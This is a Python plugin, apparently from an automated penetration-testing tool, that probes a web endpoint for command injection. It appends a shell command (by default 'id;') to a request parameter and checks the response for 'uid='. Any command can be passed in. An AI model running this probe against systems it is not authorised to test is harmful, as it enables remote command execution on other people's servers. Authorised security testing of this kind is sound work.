from __future__ import annotations

import asyncio
from typing import Any, Dict

import requests

from adaptive_pen_test.plugin_manager import BasePlugin


class CmdInjectPlugin(BasePlugin):
    """Test for command injection and attempt to execute a benign command."""

    async def run(self, params: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        endpoint = params.get("endpoint")
        inject_param = params.get("inject_param", "cmd")
        command = params.get("command", "id")
        target_ip = context.get("target", {}).get("ip")
        url = f"http://{target_ip}{endpoint}" if target_ip else endpoint
        payload = {inject_param: f"{command};"}
        loop = asyncio.get_running_loop()
        response = await loop.run_in_executor(None, lambda: requests.get(url, params=payload, timeout=5))
        success = response.status_code == 200 and "uid=" in response.text
        return {"url": url, "payload": payload, "status_code": response.status_code, "success": success, "output_snippet": response.text[:200]}
